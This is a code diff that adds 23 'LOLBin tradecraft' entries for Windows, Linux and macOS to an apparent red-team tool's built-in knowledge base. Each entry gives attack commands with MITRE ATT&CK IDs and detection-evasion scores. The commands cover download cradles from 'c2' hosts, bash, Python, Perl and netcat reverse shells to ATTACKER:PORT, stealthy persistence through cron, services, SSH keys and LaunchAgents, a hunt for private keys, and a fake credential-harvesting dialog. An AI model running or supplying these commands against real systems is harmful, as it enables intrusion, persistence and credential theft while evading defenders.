@@ -197,6 +197,343 @@ BUILTIN_TRADECRAFT = [
             "8. Test if disabled form fields are still processed server-side"
         ),
     },
+
+    # ===== LOLBin Tradecraft (23 entries) =====
+
+    # --- Windows LOLBins (10) ---
+    {
+        "name": "LOLBin: PowerShell Download Cradle",
+        "category": "evasion",
+        "description": "Use PowerShell to download files and execute commands stealthily",
+        "content": (
+            "PowerShell download cradle techniques for file staging and C2:\n"
+            "1. IEX (New-Object Net.WebClient).DownloadString('http://c2/payload')\n"
+            "2. powershell -enc <base64> for obfuscated execution\n"
+            "3. Use -WindowStyle Hidden for stealth\n"
+            "4. Split commands across multiple invocations to avoid detection\n\n"
+            "MITRE ATT&CK: T1059.001, T1105\n"
+            "Detection Profile: AV=0.3, IDS=0.4, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.5, Traffic=0.6, Logs=0.7, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: CertUtil File Download",
+        "category": "evasion",
+        "description": "Abuse CertUtil to download files bypassing restrictions",
+        "content": (
+            "CertUtil download bypass techniques:\n"
+            "1. certutil -urlcache -f http://c2/payload output.txt\n"
+            "2. certutil -encode data.txt data.b64 (encoding for exfil)\n"
+            "3. certutil -decode data.b64 data.exe (decode staged payloads)\n\n"
+            "MITRE ATT&CK: T1105, T1140\n"
+            "Detection Profile: AV=0.2, IDS=0.3, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.4, Traffic=0.5, Logs=0.6, Memory=0.2"
+        ),
+    },
+    {
+        "name": "LOLBin: BITSAdmin Transfer",
+        "category": "evasion",
+        "description": "Use BITS service for stealthy background file transfers",
+        "content": (
+            "BITSAdmin background transfer for payload staging:\n"
+            "1. bitsadmin /transfer job /download /priority normal URL LOCAL\n"
+            "2. Transfers survive reboots and run in background\n"
+            "3. Use low priority to blend with Windows Update traffic\n\n"
+            "MITRE ATT&CK: T1105, T1197\n"
+            "Detection Profile: AV=0.2, IDS=0.3, EDR=0.3, Heuristic=0.2, "
+            "Sandbox=0.3, Traffic=0.4, Logs=0.5, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: MSBuild Code Execution",
+        "category": "evasion",
+        "description": "Execute code via MSBuild XML project files to bypass whitelisting",
+        "content": (
+            "MSBuild execution for application whitelisting bypass:\n"
+            "1. Create .csproj with inline C# code in <Task> element\n"
+            "2. msbuild.exe project.csproj executes embedded code\n"
+            "3. Signed Microsoft binary - trusted by default\n\n"
+            "MITRE ATT&CK: T1127.001\n"
+            "Detection Profile: AV=0.15, IDS=0.1, EDR=0.3, Heuristic=0.2, "
+            "Sandbox=0.3, Traffic=0.1, Logs=0.4, Memory=0.2"
+        ),
+    },
+    {
+        "name": "LOLBin: RegSvr32 Scriptlet",
+        "category": "evasion",
+        "description": "Execute scripts via RegSvr32 scriptlets for defense evasion",
+        "content": (
+            "RegSvr32 scriptlet execution bypass:\n"
+            "1. regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll\n"
+            "2. Downloads and executes remote .sct scriptlets\n"
+            "3. Proxy-aware, bypasses application whitelisting\n\n"
+            "MITRE ATT&CK: T1218.010\n"
+            "Detection Profile: AV=0.25, IDS=0.3, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.4, Traffic=0.5, Logs=0.5, Memory=0.2"
+        ),
+    },
+    {
+        "name": "LOLBin: WMI Remote Execution",
+        "category": "exploitation",
+        "description": "Execute commands remotely via WMI for lateral movement",
+        "content": (
+            "WMI-based lateral movement and remote execution:\n"
+            "1. wmic /node:TARGET process call create 'cmd.exe /c COMMAND'\n"
+            "2. WMI event subscriptions for persistence\n"
+            "3. WMI queries for host discovery and enumeration\n\n"
+            "MITRE ATT&CK: T1047, T1569.002\n"
+            "Detection Profile: AV=0.2, IDS=0.3, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.4, Traffic=0.4, Logs=0.6, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: Scheduled Task Persistence",
+        "category": "exploitation",
+        "description": "Create scheduled tasks for persistent access and execution",
+        "content": (
+            "Scheduled task persistence techniques:\n"
+            "1. schtasks /create /tn 'TaskName' /tr 'cmd.exe /c COMMAND' /sc daily\n"
+            "2. Use legitimate-sounding task names (GoogleUpdate, WindowsDefender)\n"
+            "3. Set triggers during business hours to blend in\n\n"
+            "MITRE ATT&CK: T1053.005\n"
+            "Detection Profile: AV=0.1, IDS=0.1, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.3, Traffic=0.1, Logs=0.7, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: SC Service Creation",
+        "category": "exploitation",
+        "description": "Create Windows services for persistence with SC.exe",
+        "content": (
+            "Windows service persistence via sc.exe:\n"
+            "1. sc create ServiceName binPath= 'cmd.exe /c COMMAND' start= auto\n"
+            "2. Services auto-start on boot with SYSTEM privileges\n"
+            "3. Use legitimate service names for stealth\n\n"
+            "MITRE ATT&CK: T1543.003\n"
+            "Detection Profile: AV=0.15, IDS=0.1, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.4, Traffic=0.1, Logs=0.8, Memory=0.2"
+        ),
+    },
+    {
+        "name": "LOLBin: Rundll32 DLL Execution",
+        "category": "evasion",
+        "description": "Execute DLL functions via Rundll32 for defense evasion",
+        "content": (
+            "Rundll32 DLL execution for whitelisting bypass:\n"
+            "1. rundll32.exe payload.dll,EntryPoint\n"
+            "2. rundll32.exe javascript:'..\\mshtml,...'\n"
+            "3. Signed Windows binary, trusted by most EDR\n\n"
+            "MITRE ATT&CK: T1218.011\n"
+            "Detection Profile: AV=0.3, IDS=0.2, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.4, Traffic=0.2, Logs=0.5, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: NET Command Discovery",
+        "category": "reconnaissance",
+        "description": "Network and system discovery using NET commands",
+        "content": (
+            "NET command reconnaissance:\n"
+            "1. net user - enumerate local users\n"
+            "2. net group 'Domain Admins' /domain - find domain admins\n"
+            "3. net view - discover network shares\n"
+            "4. net localgroup administrators - list local admins\n\n"
+            "MITRE ATT&CK: T1087.001, T1087.002, T1135\n"
+            "Detection Profile: AV=0.05, IDS=0.1, EDR=0.3, Heuristic=0.2, "
+            "Sandbox=0.2, Traffic=0.2, Logs=0.5, Memory=0.1"
+        ),
+    },
+
+    # --- Linux LOLBins (10) ---
+    {
+        "name": "LOLBin: Bash Reverse Shell",
+        "category": "exploitation",
+        "description": "Create reverse shell connections using Bash built-ins",
+        "content": (
+            "Bash reverse shell techniques:\n"
+            "1. bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n"
+            "2. Use /dev/tcp for native socket without external tools\n"
+            "3. Combine with nohup for persistence across terminal close\n\n"
+            "MITRE ATT&CK: T1059.004, T1071.001\n"
+            "Detection Profile: AV=0.2, IDS=0.4, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: Curl/Wget Download",
+        "category": "evasion",
+        "description": "Download files via curl or wget for payload staging",
+        "content": (
+            "Curl/wget file staging techniques:\n"
+            "1. curl http://c2/payload -o /tmp/payload\n"
+            "2. wget http://c2/payload -O /tmp/payload -q (quiet mode)\n"
+            "3. curl with --socks5 for proxy pivoting\n"
+            "4. Use -k to ignore certificate errors for self-signed C2\n\n"
+            "MITRE ATT&CK: T1105\n"
+            "Detection Profile: AV=0.15, IDS=0.3, EDR=0.3, Heuristic=0.2, "
+            "Sandbox=0.3, Traffic=0.5, Logs=0.4, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: Cron Job Persistence",
+        "category": "exploitation",
+        "description": "Create cron jobs for persistent scheduled execution",
+        "content": (
+            "Cron-based persistence:\n"
+            "1. echo '* * * * * /tmp/backdoor.sh' | crontab -\n"
+            "2. Write to /etc/cron.d/ for system-level crons\n"
+            "3. Use @reboot directive for boot persistence\n\n"
+            "MITRE ATT&CK: T1053.003\n"
+            "Detection Profile: AV=0.1, IDS=0.1, EDR=0.3, Heuristic=0.2, "
+            "Sandbox=0.3, Traffic=0.1, Logs=0.6, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: SSH Key Persistence",
+        "category": "exploitation",
+        "description": "Add SSH authorized keys for persistent backdoor access",
+        "content": (
+            "SSH key persistence:\n"
+            "1. echo 'ssh-rsa ATTACKER_KEY' >> ~/.ssh/authorized_keys\n"
+            "2. Create new key pair and inject public key\n"
+            "3. Set correct permissions (700 .ssh, 600 authorized_keys)\n\n"
+            "MITRE ATT&CK: T1098.004\n"
+            "Detection Profile: AV=0.05, IDS=0.1, EDR=0.2, Heuristic=0.1, "
+            "Sandbox=0.2, Traffic=0.1, Logs=0.5, Memory=0.0"
+        ),
+    },
+    {
+        "name": "LOLBin: Python Reverse Shell",
+        "category": "exploitation",
+        "description": "Create reverse shell using Python interpreter",
+        "content": (
+            "Python reverse shell:\n"
+            "1. python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n"
+            "2. Works on most Linux systems with Python installed\n"
+            "3. Use python3 on modern systems\n\n"
+            "MITRE ATT&CK: T1059.006, T1071.001\n"
+            "Detection Profile: AV=0.2, IDS=0.4, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: Systemd Service Persistence",
+        "category": "exploitation",
+        "description": "Create systemd services for boot-persistent access",
+        "content": (
+            "Systemd service persistence:\n"
+            "1. Create .service file in /etc/systemd/system/\n"
+            "2. systemctl enable malicious.service\n"
+            "3. Survives reboots, runs as configured user\n"
+            "4. Use legitimate-sounding service names\n\n"
+            "MITRE ATT&CK: T1543.002\n"
+            "Detection Profile: AV=0.1, IDS=0.1, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.3, Traffic=0.1, Logs=0.7, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: Find Command Discovery",
+        "category": "reconnaissance",
+        "description": "Discover sensitive files and directories using find",
+        "content": (
+            "File discovery with find:\n"
+            "1. find / -name '*.conf' 2>/dev/null - configuration files\n"
+            "2. find /home -name '*.key' -o -name 'id_rsa' - SSH keys\n"
+            "3. find / -perm -4000 2>/dev/null - SUID binaries\n"
+            "4. find / -writable -type d 2>/dev/null - writable directories\n\n"
+            "MITRE ATT&CK: T1083\n"
+            "Detection Profile: AV=0.0, IDS=0.0, EDR=0.2, Heuristic=0.1, "
+            "Sandbox=0.2, Traffic=0.0, Logs=0.3, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: Netcat Listener",
+        "category": "exploitation",
+        "description": "Create bind/reverse shells and transfer files with netcat",
+        "content": (
+            "Netcat C2 and file transfer:\n"
+            "1. nc -lvp 4444 -e /bin/bash (bind shell)\n"
+            "2. nc ATTACKER PORT -e /bin/bash (reverse shell)\n"
+            "3. nc -lvp 4444 > received_file (file transfer)\n\n"
+            "MITRE ATT&CK: T1071.001\n"
+            "Detection Profile: AV=0.15, IDS=0.5, EDR=0.6, Heuristic=0.5, "
+            "Sandbox=0.6, Traffic=0.7, Logs=0.5, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: Perl Reverse Shell",
+        "category": "exploitation",
+        "description": "Create reverse shell using Perl interpreter",
+        "content": (
+            "Perl reverse shell:\n"
+            "1. perl -e 'use Socket;$i=\"ATTACKER\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n"
+            "2. Available on many systems even without Python\n\n"
+            "MITRE ATT&CK: T1059.006, T1071.001\n"
+            "Detection Profile: AV=0.2, IDS=0.4, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: SSH Tunneling",
+        "category": "exploitation",
+        "description": "Create SSH tunnels for pivoting and proxying",
+        "content": (
+            "SSH tunneling for lateral movement:\n"
+            "1. ssh -L 8080:internal:80 user@jumphost (local forward)\n"
+            "2. ssh -R 8080:localhost:80 user@jumphost (remote forward)\n"
+            "3. ssh -D 1080 user@jumphost (SOCKS proxy)\n"
+            "4. Use -N -f for background tunnels\n\n"
+            "MITRE ATT&CK: T1021.004, T1090.001\n"
+            "Detection Profile: AV=0.1, IDS=0.3, EDR=0.3, Heuristic=0.2, "
+            "Sandbox=0.3, Traffic=0.4, Logs=0.5, Memory=0.2"
+        ),
+    },
+
+    # --- macOS LOLBins (3) ---
+    {
+        "name": "LOLBin: LaunchAgent Persistence (macOS)",
+        "category": "exploitation",
+        "description": "Create LaunchAgents for persistent access on macOS",
+        "content": (
+            "macOS LaunchAgent persistence:\n"
+            "1. Create .plist in ~/Library/LaunchAgents/\n"
+            "2. launchctl load ~/Library/LaunchAgents/com.malicious.plist\n"
+            "3. Runs at user login, survives reboots\n"
+            "4. Use legitimate-sounding reverse-DNS names\n\n"
+            "MITRE ATT&CK: T1543.001\n"
+            "Detection Profile: AV=0.15, IDS=0.1, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.3, Traffic=0.1, Logs=0.6, Memory=0.1"
+        ),
+    },
+    {
+        "name": "LOLBin: Python Reverse Shell (macOS)",
+        "category": "exploitation",
+        "description": "Create reverse shell using macOS Python interpreter",
+        "content": (
+            "macOS Python reverse shell:\n"
+            "1. python3 -c 'import socket,subprocess,os;...'\n"
+            "2. Python is pre-installed on most macOS systems\n"
+            "3. Network connections from python are somewhat common\n\n"
+            "MITRE ATT&CK: T1059.006, T1071.001\n"
+            "Detection Profile: AV=0.25, IDS=0.4, EDR=0.5, Heuristic=0.4, "
+            "Sandbox=0.5, Traffic=0.6, Logs=0.5, Memory=0.3"
+        ),
+    },
+    {
+        "name": "LOLBin: AppleScript Execution (macOS)",
+        "category": "evasion",
+        "description": "Execute AppleScript via osascript for macOS operations",
+        "content": (
+            "macOS osascript execution:\n"
+            "1. osascript -e 'do shell script \"COMMAND\"'\n"
+            "2. osascript -e 'display dialog \"Fake Prompt\"' (credential harvest)\n"
+            "3. Native macOS binary, trusted by Gatekeeper\n"
+            "4. Can interact with macOS UI elements\n\n"
+            "MITRE ATT&CK: T1059.002\n"
+            "Detection Profile: AV=0.2, IDS=0.2, EDR=0.4, Heuristic=0.3, "
+            "Sandbox=0.4, Traffic=0.2, Logs=0.5, Memory=0.2"
+        ),
+    },
 ]
 
 
